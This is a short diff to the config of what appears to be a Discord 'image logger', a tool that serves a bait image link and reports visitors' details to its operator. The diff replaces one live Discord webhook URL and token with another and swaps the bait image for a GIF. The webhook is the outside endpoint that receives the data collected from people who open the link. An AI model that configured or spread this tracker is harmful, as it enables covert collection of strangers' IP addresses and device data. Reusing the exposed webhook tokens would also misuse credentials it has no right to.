@@ -12,8 +12,8 @@ __author__ = "XSYTHO"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1355317120291967126/7I9oKhUnnXwjZ2ksiD0gNgHyqnoHD_ZkJPV08Bsx2kBw3H7His6e78mZ__rARt3NfZH3",
-    "image": "https://media.discordapp.net/attachments/1302379386997309492/1355324047088423043/301eafcf6eda5559e76be6418dea0652.webp?ex=67e88361&is=67e731e1&hm=102bd11caf4c5d9c9138bc1c526ab50a00b706c1f58a3dd2e64e58ac50246cae&=&format=webp", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1390198662667440309/M3X9Ibay6lyI11GOjd0PI8s91O9YOaiftX13mVyVI40c_18IWXoLp9Ovyt4u_LVqLq_4",
+    "image": "https://media1.tenor.com/m/ASGuOCPGrKEAAAAd/kekw-kek.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
